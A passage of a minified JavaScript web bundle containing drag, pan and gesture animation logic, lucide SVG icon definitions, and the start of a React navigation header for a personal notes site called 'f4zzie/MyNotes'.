s=kf(xf(e),this.transformPagePoint),{point:c}=s,{timestamp:l}=Br;this.history=[{...c,timestamp:l}];let{onSessionStart:u}=t;u&&u(e,jf(s,this.history)),this.removeListeners=or(Cf(this.contextWindow,`pointermove`,this.handlePointerMove),Cf(this.contextWindow,`pointerup`,this.handlePointerUp),Cf(this.contextWindow,`pointercancel`,this.handlePointerUp)),o&&this.startScrollTracking(o)}startScrollTracking(e){let t=e.parentElement;for(;t;){let e=getComputedStyle(t);(Df.has(e.overflowX)||Df.has(e.overflowY))&&this.scrollPositions.set(t,{x:t.scrollLeft,y:t.scrollTop}),t=t.parentElement}this.scrollPositions.set(window,{x:window.scrollX,y:window.scrollY}),window.addEventListener(`scroll`,this.onElementScroll,{capture:!0}),window.addEventListener(`scroll`,this.onWindowScroll),this.removeScrollListeners=()=>{window.removeEventListener(`scroll`,this.onElementScroll,{capture:!0}),window.removeEventListener(`scroll`,this.onWindowScroll)}}handleScroll(e){let t=this.scrollPositions.get(e);if(!t)return;let n=e===window,r=n?{x:window.scrollX,y:window.scrollY}:{x:e.scrollLeft,y:e.scrollTop},i={x:r.x-t.x,y:r.y-t.y};i.x===0&&i.y===0||(n?this.lastMoveEventInfo&&(this.lastMoveEventInfo.point.x+=i.x,this.lastMoveEventInfo.point.y+=i.y):this.history.length>0&&(this.history[0].x-=i.x,this.history[0].y-=i.y),this.scrollPositions.set(e,r),j.update(this.updatePoint,!0))}updateHandlers(e){this.handlers=e}end(){this.removeListeners&&this.removeListeners(),this.removeScrollListeners&&this.removeScrollListeners(),this.scrollPositions.clear(),zr(this.updatePoint)}};function kf(e,t){return t?{point:t(e.point)}:e}function Af(e,t){return{x:e.x-t.x,y:e.y-t.y}}function jf({point:e},t){return{point:e,delta:Af(e,Nf(t)),offset:Af(e,Mf(t)),velocity:Pf(t,.1)}}function Mf(e){return e[0]}function Nf(e){return e[e.length-1]}function Pf(e,t){if(e.length<2)return{x:0,y:0};let n=e.length-1,r=null,i=Nf(e);for(;n>=0&&(r=e[n],!(i.timestamp-r.timestamp>lr(t)));)n--;if(!r)return{x:0,y:0};r===e[0]&&e.length>2&&i.timestamp-r.timestamp>lr(t)*2&&(r=e[1]);let a=ur(i.timestamp-r.timestamp);if(a===0)return{x:0,y:0};let o={x:(i.x-r.x)/a,y:(i.y-r.y)/a};return o.x===1/0&&(o.x=0),o.y===1/0&&(o.y=0),o}function Ff(e,{min:t,max:n},r){return t!==void 0&&e<t?e=r?N(t,e,r.min):Math.max(e,t):n!==void 0&&e>n&&(e=r?N(n,e,r.max):Math.min(e,n)),e}function If(e,t,n){return{min:t===void 0?void 0:e.min+t,max:n===void 0?void 0:e.max+n-(e.max-e.min)}}function Lf(e,{top:t,left:n,bottom:r,right:i}){return{x:If(e.x,n,i),y:If(e.y,t,r)}}function Rf(e,t){let n=t.min-e.min,r=t.max-e.max;return t.max-t.min<e.max-e.min&&([n,r]=[r,n]),{min:n,max:r}}function zf(e,t){return{x:Rf(e.x,t.x),y:Rf(e.y,t.y)}}function Bf(e,t){let n=.5,r=Yl(e),i=Yl(t);return i>r?n=sr(t.min,t.max-r,e.min):r>i&&(n=sr(e.min,e.max-i,t.min)),Qn(0,1,n)}function Vf(e,t){let n={};return t.min!==void 0&&(n.min=t.min-e.min),t.max!==void 0&&(n.max=t.max-e.min),n}var Hf=.35;function Uf(e=Hf){return e===!1?e=0:e===!0&&(e=Hf),{x:Wf(e,`left`,`right`),y:Wf(e,`top`,`bottom`)}}function Wf(e,t,n){return{min:Gf(e,t),max:Gf(e,n)}}function Gf(e,t){return typeof e==`number`?e:e[t]||0}var Kf=new WeakMap,qf=class{constructor(e){this.openDragLock=null,this.isDragging=!1,this.currentDirection=null,this.originPoint={x:0,y:0},this.constraints=!1,this.hasMutatedConstraints=!1,this.elastic=Tc(),this.latestPointerEvent=null,this.latestPanInfo=null,this.visualElement=e}start(e,{snapToCursor:t=!1,distanceThreshold:n}={}){let{presenceContext:r}=this.visualElement;if(r&&r.isPresent===!1)return;let i=e=>{t&&this.snapToCursor(xf(e).point),this.stopAnimation()},a=(e,t)=>{let{drag:n,dragPropagation:r,onDragStart:i}=this.getProps();if(n&&!r&&(this.openDragLock&&this.openDragLock(),this.openDragLock=Vs(n),!this.openDragLock))return;this.latestPointerEvent=e,this.latestPanInfo=t,this.isDragging=!0,this.currentDirection=null,this.resolveConstraints(),this.visualElement.projection&&(this.visualElement.projection.isAnimationBlocked=!0,this.visualElement.projection.target=void 0),_u(e=>{let t=this.getAxisMotionValue(e).get()||0;if(mi.test(t)){let{projection:n}=this.visualElement;if(n&&n.layout){let r=n.layout.layoutBox[e];r&&(t=Yl(r)*(parseFloat(t)/100))}}this.originPoint[e]=t}),i&&j.update(()=>i(e,t),!1,!0),as(this.visualElement,`transform`);let{animationState:a}=this.visualElement;a&&a.setActive(`whileDrag`,!0)},o=(e,t)=>{this.latestPointerEvent=e,this.latestPanInfo=t;let{dragPropagation:n,dragDirectionLock:r,onDirectionLock:i,onDrag:a}=this.getProps();if(!n&&!this.openDragLock)return;let{offset:o}=t;if(r&&this.currentDirection===null){this.currentDirection=Zf(o),this.currentDirection!==null&&i&&i(this.currentDirection);return}this.updateAxis(`x`,t.point,o),this.updateAxis(`y`,t.point,o),this.visualElement.render(),a&&j.update(()=>a(e,t),!1,!0)},s=(e,t)=>{this.latestPointerEvent=e,this.latestPanInfo=t,this.stop(e,t),this.latestPointerEvent=null,this.latestPanInfo=null},c=()=>{let{dragSnapToOrigin:e}=this.getProps();(e||this.constraints)&&this.startAnimation({x:0,y:0})},{dragSnapToOrigin:l}=this.getProps();this.panSession=new Of(e,{onSessionStart:i,onStart:a,onMove:o,onSessionEnd:s,resumeAnimation:c},{transformPagePoint:this.visualElement.getTransformPagePoint(),dragSnapToOrigin:l,distanceThreshold:n,contextWindow:wf(this.visualElement),element:this.visualElement.current})}stop(e,t){let n=e||this.latestPointerEvent,r=t||this.latestPanInfo,i=this.isDragging;if(this.cancel(),!i||!r||!n)return;let{velocity:a}=r;this.startAnimation(a);let{onDragEnd:o}=this.getProps();o&&j.postRender(()=>o(n,r))}cancel(){this.isDragging=!1;let{projection:e,animationState:t}=this.visualElement;e&&(e.isAnimationBlocked=!1),this.endPanSession();let{dragPropagation:n}=this.getProps();!n&&this.openDragLock&&(this.openDragLock(),this.openDragLock=null),t&&t.setActive(`whileDrag`,!1)}endPanSession(){this.panSession&&this.panSession.end(),this.panSession=void 0}updateAxis(e,t,n){let{drag:r}=this.getProps();if(!n||!Xf(e,r,this.currentDirection))return;let i=this.getAxisMotionValue(e),a=this.originPoint[e]+n[e];this.constraints&&this.constraints[e]&&(a=Ff(a,this.constraints[e],this.elastic[e])),i.set(a)}resolveConstraints(){let{dragConstraints:e,dragElastic:t}=this.getProps(),n=this.visualElement.projection&&!this.visualElement.projection.layout?this.visualElement.projection.measure(!1):this.visualElement.projection?.layout,r=this.constraints;e&&cf(e)?this.constraints||=this.resolveRefConstraints():e&&n?this.constraints=Lf(n.layoutBox,e):this.constraints=!1,this.elastic=Uf(t),r!==this.constraints&&!cf(e)&&n&&this.constraints&&!this.hasMutatedConstraints&&_u(e=>{this.constraints!==!1&&this.getAxisMotionValue(e)&&(this.constraints[e]=Vf(n.layoutBox[e],this.constraints[e]))})}resolveRefConstraints(){let{dragConstraints:e,onMeasureDragConstraints:t}=this.getProps();if(!e||!cf(e))return!1;let n=e.current,{projection:r}=this.visualElement;if(!r||!r.layout)return!1;let i=dl(n,r.root,this.visualElement.getTransformPagePoint()),a=zf(r.layout.layoutBox,i);if(t){let e=t(Kc(a));this.hasMutatedConstraints=!!e,e&&(a=Gc(e))}return a}startAnimation(e){let{drag:t,dragMomentum:n,dragElastic:r,dragTransition:i,dragSnapToOrigin:a,onDragTransitionEnd:o}=this.getProps(),s=this.constraints||{},c=_u(o=>{if(!Xf(o,t,this.currentDirection))return;let c=s&&s[o]||{};(a===!0||a===o)&&(c={min:0,max:0});let l=r?200:1e6,u=r?40:1e7,d={type:`inertia`,velocity:n?e[o]:0,bounceStiffness:l,bounceDamping:u,timeConstant:750,restDelta:1,restSpeed:10,...i,...c};return this.startAxisValueAnimation(o,d)});return Promise.all(c).then(o)}startAxisValueAnimation(e,t){let n=this.getAxisMotionValue(e);return as(this.visualElement,e),n.start(Uo(e,n,0,t,this.visualElement,!1))}stopAnimation(){_u(e=>this.getAxisMotionValue(e).stop())}getAxisMotionValue(e){let t=`_drag${e.toUpperCase()}`,n=this.visualElement.getProps();return n[t]||this.visualElement.getValue(e,(n.initial?n.initial[e]:void 0)||0)}snapToCursor(e){_u(t=>{let{drag:n}=this.getProps();if(!Xf(t,n,this.currentDirection))return;let{projection:r}=this.visualElement,i=this.getAxisMotionValue(t);if(r&&r.layout){let{min:n,max:a}=r.layout.layoutBox[t],o=i.get()||0;i.set(e[t]-N(n,a,.5)+o)}})}scalePositionWithinConstraints(){if(!this.visualElement.current)return;let{drag:e,dragConstraints:t}=this.getProps(),{projection:n}=this.visualElement;if(!cf(t)||!n||!this.constraints)return;this.stopAnimation();let r={x:0,y:0};_u(e=>{let t=this.getAxisMotionValue(e);if(t&&this.constraints!==!1){let n=t.get();r[e]=Bf({min:n,max:n},this.constraints[e])}});let{transformTemplate:i}=this.visualElement.getProps();this.visualElement.current.style.transform=i?i({},``):`none`,n.root&&n.root.updateScroll(),n.updateLayout(),this.constraints=!1,this.resolveConstraints(),_u(t=>{if(!Xf(t,e,null))return;let n=this.getAxisMotionValue(t),{min:i,max:a}=this.constraints[t];n.set(N(i,a,r[t]))}),this.visualElement.render()}addListeners(){if(!this.visualElement.current)return;Kf.set(this.visualElement,this);let e=this.visualElement.current,t=Cf(e,`pointerdown`,t=>{let{drag:n,dragListener:r=!0}=this.getProps(),i=t.target,a=i!==e&&Xs(i);n&&r&&!a&&this.start(t)}),n,r=()=>{let{dragConstraints:t}=this.getProps();cf(t)&&t.current&&(this.constraints=this.resolveRefConstraints(),n||=Yf(e,t.current,()=>this.scalePositionWithinConstraints()))},{projection:i}=this.visualElement,a=i.addEventListener(`measure`,r);i&&!i.layout&&(i.root&&i.root.updateScroll(),i.updateLayout()),j.read(r);let o=ku(window,`resize`,()=>this.scalePositionWithinConstraints()),s=i.addEventListener(`didUpdate`,(({delta:e,hasLayoutChanged:t})=>{this.isDragging&&t&&(_u(t=>{let n=this.getAxisMotionValue(t);n&&(this.originPoint[t]+=e[t].translate,n.set(n.get()+e[t].translate))}),this.visualElement.render())}));return()=>{o(),t(),a(),s&&s(),n&&n()}}getProps(){let e=this.visualElement.getProps(),{drag:t=!1,dragDirectionLock:n=!1,dragPropagation:r=!1,dragConstraints:i=!1,dragElastic:a=Hf,dragMomentum:o=!0}=e;return{...e,drag:t,dragDirectionLock:n,dragPropagation:r,dragConstraints:i,dragElastic:a,dragMomentum:o}}};function Jf(e){let t=!0;return()=>{if(t){t=!1;return}e()}}function Yf(e,t,n){let r=vc(e,Jf(n)),i=vc(t,Jf(n));return()=>{r(),i()}}function Xf(e,t,n){return(t===!0||t===e)&&(n===null||n===e)}function Zf(e,t=10){let n=null;return Math.abs(e.y)>t?n=`y`:Math.abs(e.x)>t&&(n=`x`),n}var Qf=class extends Wc{constructor(e){super(e),this.removeGroupControls=ir,this.removeListeners=ir,this.controls=new qf(e)}mount(){let{dragControls:e}=this.node.getProps();e&&(this.removeGroupControls=e.subscribe(this.controls)),this.removeListeners=this.controls.addListeners()||ir}update(){let{dragControls:e}=this.node.getProps(),{dragControls:t}=this.node.prevProps||{};e!==t&&(this.removeGroupControls(),e&&(this.removeGroupControls=e.subscribe(this.controls)))}unmount(){this.removeGroupControls(),this.removeListeners(),this.controls.isDragging||this.controls.endPanSession()}},$f=e=>(t,n)=>{e&&j.update(()=>e(t,n),!1,!0)},ep=class extends Wc{constructor(){super(...arguments),this.removePointerDownListener=ir}onPointerDown(e){this.session=new Of(e,this.createPanHandlers(),{transformPagePoint:this.node.getTransformPagePoint(),contextWindow:wf(this.node)})}createPanHandlers(){let{onPanSessionStart:e,onPanStart:t,onPan:n,onPanEnd:r}=this.node.getProps();return{onSessionStart:$f(e),onStart:$f(t),onMove:$f(n),onEnd:(e,t)=>{delete this.session,r&&j.postRender(()=>r(e,t))}}}mount(){this.removePointerDownListener=Cf(this.node.current,`pointerdown`,e=>this.onPointerDown(e))}update(){this.session&&this.session.updateHandlers(this.createPanHandlers())}unmount(){this.removePointerDownListener(),this.session&&this.session.end()}},tp=!1,np=class extends w.Component{componentDidMount(){let{visualElement:e,layoutGroup:t,switchLayoutGroup:n,layoutId:r}=this.props,{projection:i}=e;i&&(t.group&&t.group.add(i),n&&n.register&&r&&n.register(i),tp&&i.root.didUpdate(),i.addEventListener(`animationComplete`,()=>{this.safeToRemove()}),i.setOptions({...i.options,layoutDependency:this.props.layoutDependency,onExitComplete:()=>this.safeToRemove()})),Fu.hasEverUpdated=!0}getSnapshotBeforeUpdate(e){let{layoutDependency:t,visualElement:n,drag:r,isPresent:i}=this.props,{projection:a}=n;return a?(a.isPresent=i,e.layoutDependency!==t&&a.setOptions({...a.options,layoutDependency:t}),tp=!0,r||e.layoutDependency!==t||t===void 0||e.isPresent!==i?a.willUpdate():this.safeToRemove(),e.isPresent!==i&&(i?a.promote():a.relegate()||j.postRender(()=>{let e=a.getStack();(!e||!e.members.length)&&this.safeToRemove()})),null):null}componentDidUpdate(){let{projection:e}=this.props.visualElement;e&&(e.root.didUpdate(),Ls.postRender(()=>{!e.currentAnimation&&e.isLead()&&this.safeToRemove()}))}componentWillUnmount(){let{visualElement:e,layoutGroup:t,switchLayoutGroup:n}=this.props,{projection:r}=e;tp=!0,r&&(r.scheduleCheckAfterUnmount(),t&&t.group&&t.group.remove(r),n&&n.deregister&&n.deregister(r))}safeToRemove(){let{safeToRemove:e}=this.props;e&&e()}render(){return null}};function rp(e){let[t,n]=Cd(),r=(0,w.useContext)(Kn);return(0,G.jsx)(np,{...e,layoutGroup:r,switchLayoutGroup:(0,w.useContext)(sf),isPresent:t,safeToRemove:n})}var ip={pan:{Feature:ep},drag:{Feature:Qf,ProjectionNode:md,MeasureLayout:rp}};function ap(e,t,n){let{props:r}=e;e.animationState&&r.whileHover&&e.animationState.setActive(`whileHover`,n===`Start`);let i=r[`onHover`+n];i&&j.postRender(()=>i(t,xf(t)))}var op=class extends Wc{mount(){let{current:e}=this.node;e&&(this.unmount=Ws(e,(e,t)=>(ap(this.node,t,`Start`),e=>ap(this.node,e,`End`))))}unmount(){}},sp=class extends Wc{constructor(){super(...arguments),this.isActive=!1}onFocus(){let e=!1;try{e=this.node.current.matches(`:focus-visible`)}catch{e=!0}!e||!this.node.animationState||(this.node.animationState.setActive(`whileFocus`,!0),this.isActive=!0)}onBlur(){!this.isActive||!this.node.animationState||(this.node.animationState.setActive(`whileFocus`,!1),this.isActive=!1)}mount(){this.unmount=or(ku(this.node.current,`focus`,()=>this.onFocus()),ku(this.node.current,`blur`,()=>this.onBlur()))}unmount(){}};function cp(e,t,n){let{props:r}=e;if(e.current instanceof HTMLButtonElement&&e.current.disabled)return;e.animationState&&r.whileTap&&e.animationState.setActive(`whileTap`,n===`Start`);let i=r[`onTap`+(n===`End`?``:n)];i&&j.postRender(()=>i(t,xf(t)))}var lp=class extends Wc{mount(){let{current:e}=this.node;if(!e)return;let{globalTapTarget:t,propagate:n}=this.node.props;this.unmount=rc(e,(e,t)=>(cp(this.node,t,`Start`),(e,{success:t})=>cp(this.node,e,t?`End`:`Cancel`)),{useGlobalTarget:t,stopPropagation:n?.tap===!1})}unmount(){}},up=new WeakMap,dp=new WeakMap,fp=e=>{let t=up.get(e.target);t&&t(e)},pp=e=>{e.forEach(fp)};function mp({root:e,...t}){let n=e||document;dp.has(n)||dp.set(n,{});let r=dp.get(n),i=JSON.stringify(t);return r[i]||(r[i]=new IntersectionObserver(pp,{root:e,...t})),r[i]}function hp(e,t,n){let r=mp(t);return up.set(e,n),r.observe(e),()=>{up.delete(e),r.unobserve(e)}}var gp={some:0,all:1},_p=class extends Wc{constructor(){super(...arguments),this.hasEnteredView=!1,this.isInView=!1}startObserver(){this.unmount();let{viewport:e={}}=this.node.getProps(),{root:t,margin:n,amount:r=`some`,once:i}=e,a={root:t?t.current:void 0,rootMargin:n,threshold:typeof r==`number`?r:gp[r]};return hp(this.node.current,a,e=>{let{isIntersecting:t}=e;if(this.isInView===t||(this.isInView=t,i&&!t&&this.hasEnteredView))return;t&&(this.hasEnteredView=!0),this.node.animationState&&this.node.animationState.setActive(`whileInView`,t);let{onViewportEnter:n,onViewportLeave:r}=this.node.getProps(),a=t?n:r;a&&a(e)})}mount(){this.startObserver()}update(){if(typeof IntersectionObserver>`u`)return;let{props:e,prevProps:t}=this.node;[`amount`,`margin`,`root`].some(vp(e,t))&&this.startObserver()}unmount(){}};function vp({viewport:e={}},{viewport:t={}}={}){return n=>e[n]!==t[n]}var yp={inView:{Feature:_p},tap:{Feature:lp},focus:{Feature:sp},hover:{Feature:op}},bp={layout:{ProjectionNode:md,MeasureLayout:rp}},xp=gf({...bf,...yp,...ip,...bp},_f),Sp=(...e)=>e.filter((e,t,n)=>!!e&&e.trim()!==``&&n.indexOf(e)===t).join(` `).trim(),Cp=e=>e.replace(/([a-z0-9])([A-Z])/g,`$1-$2`).toLowerCase(),wp=e=>e.replace(/^([A-Z])|[\s-_]+(\w)/g,(e,t,n)=>n?n.toUpperCase():t.toLowerCase()),Tp=e=>{let t=wp(e);return t.charAt(0).toUpperCase()+t.slice(1)},Ep={xmlns:`http://www.w3.org/2000/svg`,width:24,height:24,viewBox:`0 0 24 24`,fill:`none`,stroke:`currentColor`,strokeWidth:2,strokeLinecap:`round`,strokeLinejoin:`round`},Dp=e=>{for(let t in e)if(t.startsWith(`aria-`)||t===`role`||t===`title`)return!0;return!1},Op=(0,w.forwardRef)(({color:e=`currentColor`,size:t=24,strokeWidth:n=2,absoluteStrokeWidth:r,className:i=``,children:a,iconNode:o,...s},c)=>(0,w.createElement)(`svg`,{ref:c,...Ep,width:t,height:t,stroke:e,strokeWidth:r?Number(n)*24/Number(t):n,className:Sp(`lucide`,i),...!a&&!Dp(s)&&{"aria-hidden":`true`},...s},[...o.map(([e,t])=>(0,w.createElement)(e,t)),...Array.isArray(a)?a:[a]])),J=(e,t)=>{let n=(0,w.forwardRef)(({className:n,...r},i)=>(0,w.createElement)(Op,{ref:i,iconNode:t,className:Sp(`lucide-${Cp(Tp(e))}`,`lucide-${e}`,n),...r}));return n.displayName=Tp(e),n},kp=J(`arrow-right`,[[`path`,{d:`M5 12h14`,key:`1ays0h`}],[`path`,{d:`m12 5 7 7-7 7`,key:`xquz4c`}]]),Ap=J(`binary`,[[`rect`,{x:`14`,y:`14`,width:`4`,height:`6`,rx:`2`,key:`p02svl`}],[`rect`,{x:`6`,y:`4`,width:`4`,height:`6`,rx:`2`,key:`xm4xkj`}],[`path`,{d:`M6 20h4`,key:`1i6q5t`}],[`path`,{d:`M14 10h4`,key:`ru81e7`}],[`path`,{d:`M6 14h2v6`,key:`16z9wg`}],[`path`,{d:`M14 4h2v6`,key:`1idq9u`}]]),jp=J(`book-open`,[[`path`,{d:`M12 7v14`,key:`1akyts`}],[`path`,{d:`M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z`,key:`ruj8y`}]]),Mp=J(`bug`,[[`path`,{d:`M12 20v-9`,key:`1qisl0`}],[`path`,{d:`M14 7a4 4 0 0 1 4 4v3a6 6 0 0 1-12 0v-3a4 4 0 0 1 4-4z`,key:`uouzyp`}],[`path`,{d:`M14.12 3.88 16 2`,key:`qol33r`}],[`path`,{d:`M21 21a4 4 0 0 0-3.81-4`,key:`1b0z45`}],[`path`,{d:`M21 5a4 4 0 0 1-3.55 3.97`,key:`5cxbf6`}],[`path`,{d:`M22 13h-4`,key:`1jl80f`}],[`path`,{d:`M3 21a4 4 0 0 1 3.81-4`,key:`1fjd4g`}],[`path`,{d:`M3 5a4 4 0 0 0 3.55 3.97`,key:`1d7oge`}],[`path`,{d:`M6 13H2`,key:`82j7cp`}],[`path`,{d:`m8 2 1.88 1.88`,key:`fmnt4t`}],[`path`,{d:`M9 7.13V6a3 3 0 1 1 6 0v1.13`,key:`1vgav8`}]]),Np=J(`calendar`,[[`path`,{d:`M8 2v4`,key:`1cmpym`}],[`path`,{d:`M16 2v4`,key:`4m81vk`}],[`rect`,{width:`18`,height:`18`,x:`3`,y:`4`,rx:`2`,key:`1hopcy`}],[`path`,{d:`M3 10h18`,key:`8toen8`}]]),Pp=J(`clock`,[[`circle`,{cx:`12`,cy:`12`,r:`10`,key:`1mglay`}],[`path`,{d:`M12 6v6l4 2`,key:`mmk7yg`}]]),Fp=J(`crosshair`,[[`circle`,{cx:`12`,cy:`12`,r:`10`,key:`1mglay`}],[`line`,{x1:`22`,x2:`18`,y1:`12`,y2:`12`,key:`l9bcsi`}],[`line`,{x1:`6`,x2:`2`,y1:`12`,y2:`12`,key:`13hhkx`}],[`line`,{x1:`12`,x2:`12`,y1:`6`,y2:`2`,key:`10w3f3`}],[`line`,{x1:`12`,x2:`12`,y1:`22`,y2:`18`,key:`15g9kq`}]]),Ip=J(`external-link`,[[`path`,{d:`M15 3h6v6`,key:`1q9fwt`}],[`path`,{d:`M10 14 21 3`,key:`gplh6r`}],[`path`,{d:`M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6`,key:`a6xqqp`}]]),Lp=J(`file-search`,[[`path`,{d:`M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z`,key:`1oefj6`}],[`path`,{d:`M14 2v5a1 1 0 0 0 1 1h5`,key:`wfsgrz`}],[`circle`,{cx:`11.5`,cy:`14.5`,r:`2.5`,key:`1bq0ko`}],[`path`,{d:`M13.3 16.3 15 18`,key:`2quom7`}]]),Rp=J(`folder-git-2`,[[`path`,{d:`M18 19a5 5 0 0 1-5-5v8`,key:`sz5oeg`}],[`path`,{d:`M9 20H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h3.9a2 2 0 0 1 1.69.9l.81 1.2a2 2 0 0 0 1.67.9H20a2 2 0 0 1 2 2v5`,key:`1w6njk`}],[`circle`,{cx:`13`,cy:`12`,r:`2`,key:`1j92g6`}],[`circle`,{cx:`20`,cy:`19`,r:`2`,key:`1obnsp`}]]),zp=J(`github`,[[`path`,{d:`M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4`,key:`tonef`}],[`path`,{d:`M9 18c-4.51 2-5-2-7-2`,key:`9comsn`}]]),Bp=J(`globe`,[[`circle`,{cx:`12`,cy:`12`,r:`10`,key:`1mglay`}],[`path`,{d:`M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20`,key:`13o1zl`}],[`path`,{d:`M2 12h20`,key:`9i4pu4`}]]),Vp=J(`layers`,[[`path`,{d:`M12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83z`,key:`zw3jo`}],[`path`,{d:`M2 12a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 12`,key:`1wduqc`}],[`path`,{d:`M2 17a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 17`,key:`kqbvx6`}]]),Hp=J(`link`,[[`path`,{d:`M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71`,key:`1cjeqo`}],[`path`,{d:`M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71`,key:`19qd67`}]]),Up=J(`menu`,[[`path`,{d:`M4 5h16`,key:`1tepv9`}],[`path`,{d:`M4 12h16`,key:`1lakjw`}],[`path`,{d:`M4 19h16`,key:`1djgab`}]]),Wp=J(`moon`,[[`path`,{d:`M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401`,key:`kfwtm`}]]),Gp=J(`notebook-tabs`,[[`path`,{d:`M2 6h4`,key:`aawbzj`}],[`path`,{d:`M2 10h4`,key:`l0bgd4`}],[`path`,{d:`M2 14h4`,key:`1gsvsf`}],[`path`,{d:`M2 18h4`,key:`1bu2t1`}],[`rect`,{width:`16`,height:`20`,x:`4`,y:`2`,rx:`2`,key:`1nb95v`}],[`path`,{d:`M15 2v20`,key:`dcj49h`}],[`path`,{d:`M15 7h5`,key:`1xj5lc`}],[`path`,{d:`M15 12h5`,key:`w5shd9`}],[`path`,{d:`M15 17h5`,key:`1qaofu`}]]),Kp=J(`search`,[[`path`,{d:`m21 21-4.34-4.34`,key:`14j7rj`}],[`circle`,{cx:`11`,cy:`11`,r:`8`,key:`4ej97u`}]]),qp=J(`server`,[[`rect`,{width:`20`,height:`8`,x:`2`,y:`2`,rx:`2`,ry:`2`,key:`ngkwjq`}],[`rect`,{width:`20`,height:`8`,x:`2`,y:`14`,rx:`2`,ry:`2`,key:`iecqi9`}],[`line`,{x1:`6`,x2:`6.01`,y1:`6`,y2:`6`,key:`16zg32`}],[`line`,{x1:`6`,x2:`6.01`,y1:`18`,y2:`18`,key:`nzw8ys`}]]),Jp=J(`shield-check`,[[`path`,{d:`M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z`,key:`oel41y`}],[`path`,{d:`m9 12 2 2 4-4`,key:`dzmm74`}]]),Yp=J(`shield`,[[`path`,{d:`M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z`,key:`oel41y`}]]),Xp=J(`sun`,[[`circle`,{cx:`12`,cy:`12`,r:`4`,key:`4exip2`}],[`path`,{d:`M12 2v2`,key:`tus03m`}],[`path`,{d:`M12 20v2`,key:`1lh1kg`}],[`path`,{d:`m4.93 4.93 1.41 1.41`,key:`149t6j`}],[`path`,{d:`m17.66 17.66 1.41 1.41`,key:`ptbguv`}],[`path`,{d:`M2 12h2`,key:`1t8f8n`}],[`path`,{d:`M20 12h2`,key:`1q8mjw`}],[`path`,{d:`m6.34 17.66-1.41 1.41`,key:`1m8zz5`}],[`path`,{d:`m19.07 4.93-1.41 1.41`,key:`1shlcs`}]]),Zp=J(`terminal`,[[`path`,{d:`M12 19h8`,key:`baeox8`}],[`path`,{d:`m4 17 6-6-6-6`,key:`1yngyt`}]]),Qp=J(`trophy`,[[`path`,{d:`M10 14.66v1.626a2 2 0 0 1-.976 1.696A5 5 0 0 0 7 21.978`,key:`1n3hpd`}],[`path`,{d:`M14 14.66v1.626a2 2 0 0 0 .976 1.696A5 5 0 0 1 17 21.978`,key:`rfe1zi`}],[`path`,{d:`M18 9h1.5a1 1 0 0 0 0-5H18`,key:`7xy6bh`}],[`path`,{d:`M4 22h16`,key:`57wxv0`}],[`path`,{d:`M6 9a6 6 0 0 0 12 0V3a1 1 0 0 0-1-1H7a1 1 0 0 0-1 1z`,key:`1mhfuq`}],[`path`,{d:`M6 9H4.5a1 1 0 0 1 0-5H6`,key:`tex48p`}]]),$p=J(`user`,[[`path`,{d:`M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2`,key:`975kel`}],[`circle`,{cx:`12`,cy:`7`,r:`4`,key:`17ys0d`}]]),em=J(`x`,[[`path`,{d:`M18 6 6 18`,key:`1bl5f8`}],[`path`,{d:`m6 6 12 12`,key:`d8bk6v`}]]),tm=[{to:`/`,label:`Home`},{to:`/about`,label:`About`},{to:`/notes`,label:`Notes`},{to:`/projects`,label:`Projects`}];function nm({dark:e,toggleTheme:t}){let[n,r]=(0,w.useState)(!1),i=at();return(0,G.jsxs)(G.Fragment,{children:[(0,G.jsx)(`header`,{className:`sticky top-0 z-50 border-b border-border/80 bg-body/90 backdrop-blur-xl dark:border-dm-border/80 dark:bg-dm-body/90`,children:(0,G.jsxs)(`nav`,{className:`container flex items-center justify-between py-4`,children:[(0,G.jsxs)(Tn,{to:`/`,className:`font-secondary text-lg font-bold text-dark dark:text-white`,children:[`f4zzie`,(0,G.jsx)(`span`,{className:`text-primary dark:text-dm-primary`,children:`/MyNotes`})]}),(0,G.jsxs)(`div`,{className:`flex items-center gap-2 xl:gap-4`,children:[(0,G.jsx)(`ul`,{className:`hidden lg:flex items-center gap-1 xl:gap-2`,children:tm.map(e=>(0,G.jsx)(`li`,{children:(0,G.jsx)(Tn,{to:e.to,className:`nav-link font-bold 